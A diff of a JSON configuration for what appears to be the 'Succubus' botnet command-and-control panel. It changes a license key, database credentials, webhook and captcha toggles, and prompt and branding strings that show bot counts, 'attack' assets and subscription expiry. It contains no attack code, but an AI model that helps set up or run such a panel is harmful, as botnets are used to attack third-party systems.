@@ -1,9 +1,9 @@
 {
-    "key":"Buy Your Own Key Pleb",
+    "key":"This Key no worky :(",
 
 	"mysql":{
 		"address":"127.0.0.1:3306",
-		"username":"username",
+		"username":"bleach",
 		"password":"password",
 		"table":"succubus"
 	},
@@ -13,7 +13,7 @@
 	},
 
     "webhook":{
-        "enabled":true,
+        "enabled":false,
         "url":"https://discord.com/api/webhooks/"
     },
 
@@ -28,19 +28,27 @@
 
     "branding":{
 
-        "title":"<<$botcount>> boats | Succubus Custom Build | Serving <<$username>> | Active Sessions <<$onlineusers>> | <<$expiry>> day(s) left",
+        "title":"<<$botcount>> boats | Succubus Custom Build | Serving <<$username>> | Active Sessions <<$onlineusers>> | <<$expiry>> ",
 		"prompt":"<argon>┌──</>[<argon>Succubus</>]-[~/<argon>succubus</>/<argon>cnc</>/<argon><<$username>></>]\r\n<argon>└───</>➤",
 		
         "assets":{
             "welcome":"succ",
             "banner":"succ",
-            "attack":"attack"
+		    "attack":"attack"
+        },
+
+        "tos":{ 
+            "enabled":false,
+            "title":"Succubus TOS (unused) plopp wanted this lol",
+            "asset":"tos",
+            "prompt":"succubus/tos >",
+            "answer":"i agree"
         },
 
         "errors":{
-            "403":"403 You Do Not Have Access!",
-            "404":"404 Asset Not Found!",
-            "500":"500 Asset Error!"
+            "403":"<theme>403 You Do Not Have Access!</>",
+            "404":"<theme>404 Asset Not Found!</>",
+            "500":"<theme>500 Asset Error!</>"
         },
 
         "hardcoded":{
@@ -57,7 +65,7 @@
         },
 
         "captcha":{
-            "enabled":true,
+            "enabled":false,
             "title":"[<<$spinner>>] Succcubus Captcha [<<$spinner>>]",
             "asset":"captcha",
             "prompt":"captcha> "
@@ -65,7 +73,6 @@
 
         "misc":{
             "memory assets":true,
-            "attack spinner":true,
 
             "-Comment- Remove this line": "This is not implemented in free succubus builds",
             "prompt colors":[
